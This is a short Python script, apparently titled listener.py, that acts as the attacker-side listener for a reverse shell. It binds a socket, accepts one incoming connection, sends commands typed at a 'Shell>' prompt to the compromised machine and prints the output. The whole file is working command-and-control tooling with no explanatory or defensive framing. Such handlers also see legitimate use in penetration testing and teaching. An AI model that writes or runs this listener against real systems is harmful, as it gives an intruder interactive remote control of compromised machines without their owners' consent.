import socket
import sys

if len(sys.argv) != 3:
    print("Usage: python listener.py <IP> <PORT>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])

# Create a listening socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen(5)

print(f"[*] Listening on {ip}:{port}")

# Accept incoming connections
client_socket, client_address = server.accept()
print(f"[*] Connection established from {client_address}")

# Handle commands from the reverse shell
while True:
    command = input("Shell> ")
    if command.lower() == 'quit':
        client_socket.send(b'quit')
        break
    else:
        client_socket.send(command.encode())
        response = client_socket.recv(1024)
        print(response.decode())

client_socket.close()
server.close()
